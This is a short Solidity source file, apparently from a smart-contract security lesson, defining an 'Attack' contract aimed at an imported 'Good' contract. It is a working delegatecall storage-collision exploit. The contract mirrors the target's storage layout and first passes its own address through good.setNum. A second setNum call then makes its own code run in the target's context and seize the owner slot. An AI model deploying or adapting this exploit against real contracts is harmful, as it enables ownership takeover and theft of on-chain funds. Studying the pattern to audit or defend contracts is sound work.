//SPDX//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Good.sol";

contract Attack {
    address public helper;
    address public owner;
    uint public num;

    Good public good;
    constructor(address _good) {
        good = Good(_good);
    }

    function setNum(uint _num) public {
        owner = msg.sender;
    }

    function attack() public {
        good.setNum(uint(uint160(address(this))));
        good.setNum(10);
    }
}